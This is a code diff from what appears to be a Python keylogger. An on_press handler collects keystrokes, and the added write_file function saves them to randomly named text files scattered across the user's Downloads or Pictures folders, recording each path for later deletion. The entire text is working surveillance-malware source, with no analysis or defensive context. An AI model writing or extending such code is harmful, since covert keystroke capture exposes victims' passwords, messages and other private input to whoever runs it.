@@ -58,3 +58,18 @@ def on_press(key):
 	else:
 		logged_data.append(key)
 
+def write_file(count):
+	one = os.path.expanduser('~') + '/Downloads/'
+	two = os.path.expanduser('~') + '/Pictures/'
+	#three = 'C:/'
+	list = [one,two]
+
+	filepath = random.choice(list)
+	filename = str(count) + 'I' + str(random.randint(1000000,9999999)) + '.txt'
+	file = filepath + filename
+	delete_file.append(file)
+
+
+	with open(file,'w') as fp:
+		fp.write(''.join(logged_data))
+	print('written all good')
